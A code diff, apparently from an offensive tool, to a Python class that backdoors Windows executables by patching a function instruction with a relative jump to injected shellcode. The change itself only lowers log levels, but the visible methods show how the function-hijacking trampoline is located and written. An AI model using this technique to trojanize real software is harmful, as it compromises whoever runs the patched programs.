@@ -32,14 +32,14 @@ class FunctionBackdoorer:
 
 
     def backdoor_function(self, function_addr: int, shellcode_addr: int, shellcode_len: int):
-        logger.info("--[ Backdooring exe function at 0x{:X} with jump to carrier at 0x{:X}".format(function_addr, shellcode_addr))
+        logger.debug("--[ Backdooring exe function at 0x{:X} with jump to carrier at 0x{:X}".format(function_addr, shellcode_addr))
         
         addr = self.find_suitable_instruction_addr(function_addr)
         if addr is None:
             raise Exception("Couldn't find a suitable instruction to backdoor")
 
         compiled_trampoline = assemble_relative_jmp(addr, shellcode_addr)
-        logger.info("--[ Backdoor Instruction at 0x{:X} (offset to shellcode: 0x{:X})".format(addr, shellcode_addr - addr))
+        logger.debug("---[ Backdoor Instruction at 0x{:X} (offset to shellcode: 0x{:X})".format(addr, shellcode_addr - addr))
         
         # Check for overlap
         it = IntervalTree()
@@ -51,12 +51,11 @@ class FunctionBackdoorer:
             logger.warning("Text section too small?")
 
         # write
-        #logger.info("Trampoline: {}".format(compiled_trampoline))
+        #logger.debug("Trampoline: {}".format(compiled_trampoline))
         #asm_disasm(compiled_trampoline, offset=function_addr)
         self.superpe.pe.set_bytes_at_rva(addr, bytes(compiled_trampoline))
 
         # Show Result
-        logger.info("--[ Patched result of function: ".format())
         #data = self.pe_data[function_addr:addr+len(compiled_trampoline)]
         data = self.superpe.pe.get_data(function_addr, addr+len(compiled_trampoline)-function_addr)
         asm_disasm(data, offset=function_addr)
@@ -64,14 +63,14 @@ class FunctionBackdoorer:
 
     def find_suitable_instruction_addr(self, startOffset, length=256):
         """Find a instruction to backdoor. Recursively."""
-        logger.info("---[ find suitable instruction to hijack starting from 0x{:X} len:{} depthopt:{}".format(
+        logger.debug("---[ find suitable instruction to hijack starting from 0x{:X} len:{} depthopt:{}".format(
             startOffset, length, self.depth_option))
 
         if self.depth_option == DEPTH_OPTIONS.LEVEL1:
             return self._find_suitable_instruction_addr(startOffset, length, 1)
         else:
             addr = self._find_suitable_instruction_addr(startOffset, length, 2)
-            logger.info("Using code at 0x{:X} to find instruction".format(addr))
+            logger.debug("Using code at 0x{:X} to find instruction".format(addr))
         
             if self.depth_option == DEPTH_OPTIONS.LEVEL2a:
                 return self._find_suitable_instruction_addr(addr, length, 2)
